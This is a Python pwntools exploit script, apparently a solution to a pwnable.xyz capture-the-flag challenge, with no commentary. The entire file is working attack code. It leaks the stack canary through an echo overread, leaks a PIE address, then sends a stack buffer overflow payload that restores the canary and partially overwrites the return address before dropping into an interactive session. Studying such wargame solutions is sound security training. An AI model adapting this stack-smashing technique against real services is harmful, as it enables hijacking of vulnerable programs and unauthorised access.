from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30027)


def getlen():
	print(target.recvuntil("me  > "))
	words=target.recvline().strip("\n")
	print(hex(len(words)))
	return len(words)

def senddata(data):
	print(target.recvuntil("you > "))
	target.send(data)
	print(target.recvuntil("said: "))
	leaks=target.recvuntil("I").strip("I")
	return leaks

while(True):
	n=getlen()
	if(n<0x68):
		senddata("A\n")
		continue
	
	canary=u64(senddata("A"*0x68+"\n")[0x68:0x68+8])-0xa
	print(hex(canary))
	break

while(True):
	n=getlen()
	if(n<0x77):
		senddata("A\n")
		continue
	
	pie_off=u64(senddata("A"*0x77+"\n")[0x78:0x78+2].ljust(8,"\x00"))-0x1081+0xd30
	print(hex(pie_off))
	break

while(True):
	n=getlen()
	if(n<0x79):
		senddata("A\n")
		continue
	l=len(hex(pie_off))	
	v=hex(pie_off)
	b1=int(v[l-2:l],16)
	b2=int(v[l-4:l-2],16)

	senddata("A"*0x68+p64(canary)+"A"*8+p8(b1)+p8(b2))
	break

print(target.recvuntil("you > "))
target.sendline("exit")
target.interactive()



target.interactive()
	
	
	
	
	
